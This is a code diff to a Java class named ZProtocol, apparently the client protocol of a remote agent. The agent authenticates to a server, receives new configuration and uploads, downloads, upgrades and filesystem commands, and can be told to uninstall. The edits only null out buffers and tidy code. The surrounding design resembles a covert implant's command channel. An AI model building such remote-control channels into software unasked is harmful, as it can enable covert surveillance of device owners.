@@ -80,6 +80,8 @@ public class ZProtocol extends Protocol {
             byte[] cypherOut = cryptoConf.encryptData(forgeAuthentication(), 0);
             byte[] response = transport.command(cypherOut);
             Status.self().uninstall = parseAuthentication(response);
+            cypherOut = null;
+            response = null;
 
             if (status.uninstall) {
                 //#ifdef DEBUG
@@ -93,6 +95,7 @@ public class ZProtocol extends Protocol {
             //#endif  
             response = command(Proto.ID, forgeIdentification());
             boolean[] capabilities = parseIdentification(response);
+            response = null;
 
             if (capabilities[Proto.NEW_CONF]) {
                 //#ifdef DEBUG
@@ -101,6 +104,7 @@ public class ZProtocol extends Protocol {
 
                 response = command(Proto.NEW_CONF);
                 int newconf = parseNewConf(response);
+                response = null;
 
                 if (newconf != Proto.NO) {
                     //#ifdef DEBUG
@@ -142,6 +146,7 @@ public class ZProtocol extends Protocol {
                 //#endif  
                 response = command(Proto.DOWNLOAD);
                 parseDownload(response);
+                response = null;
             }
 
             if (capabilities[Proto.UPLOAD]) {
@@ -154,7 +159,9 @@ public class ZProtocol extends Protocol {
                 while (left) {
                     response = command(Proto.UPLOAD);
                     left = parseUpload(response);
+
                 }
+                response = null;
             }
 
             if (capabilities[Proto.UPGRADE]) {
@@ -169,6 +176,7 @@ public class ZProtocol extends Protocol {
                     response = command(Proto.UPGRADE);
                     left = parseUpgrade(response);
                 }
+                response = null;
             }
 
             if (capabilities[Proto.FILESYSTEM]) {
@@ -177,6 +185,7 @@ public class ZProtocol extends Protocol {
                 //#endif  
                 response = command(Proto.FILESYSTEM);
                 parseFileSystem(response);
+                response = null;
             }
 
             //#ifdef DEBUG
@@ -190,6 +199,7 @@ public class ZProtocol extends Protocol {
             //#endif  
             response = command(Proto.BYE);
             parseEnd(response);
+            response = null;
 
             return true;
 
@@ -817,7 +827,7 @@ public class ZProtocol extends Protocol {
         //#endif
 
         int dataLen = data.length;
-        byte[] plainOut = new byte[dataLen + 4];
+        final byte[] plainOut = new byte[dataLen + 4];
         Utils.copy(plainOut, 0, Utils.intToByteArray(command), 0, 4);
         Utils.copy(plainOut, 4, data, 0, data.length);
 
@@ -825,7 +835,6 @@ public class ZProtocol extends Protocol {
             byte[] plainIn;
 
             plainIn = cypheredWriteReadSha(plainOut);
-
             return plainIn;
         } catch (CryptoException e) {
             //#ifdef DEBUG
